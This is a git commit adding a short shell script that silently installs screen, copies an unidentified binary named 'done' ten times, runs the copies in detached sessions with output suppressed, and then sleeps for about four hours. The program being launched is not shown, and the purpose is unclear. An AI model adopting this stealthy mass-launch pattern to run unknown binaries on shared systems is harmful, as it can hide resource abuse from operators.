f7eabab3d6e103bff3942e33dda93e69c06dea36
stackoverloww <111900859+stackoverloww@users.noreply.github.com>
2024-12-09 11:37:36 +0700

    Add files via upload

---
+++ done.sh
@@ -0,0 +1,23 @@
+apt install screen -y >/dev/null 2>&1 
+cp done done1
+cp done done2
+cp done done3
+cp done done4
+cp done done5
+cp done done6
+cp done done7
+cp done done8
+cp done done9
+cp done done10
+sleep 5
+screen -dmS done ./done z >/dev/null 2>&1 
+screen -dmS done1 ./done1 z >/dev/null 2>&1 
+screen -dmS done2 ./done2 z >/dev/null 2>&1 
+screen -dmS done3 ./done3 z >/dev/null 2>&1 
+screen -dmS done4 ./done4 z >/dev/null 2>&1 
+screen -dmS done5 ./done5 z >/dev/null 2>&1 
+screen -dmS done6 ./done6 z >/dev/null 2>&1 
+screen -dmS done7 ./done7 z >/dev/null 2>&1 
+screen -dmS done8 ./done8 z >/dev/null 2>&1 
+screen -dmS done9 ./done9 z >/dev/null 2>&1
+sleep 14440
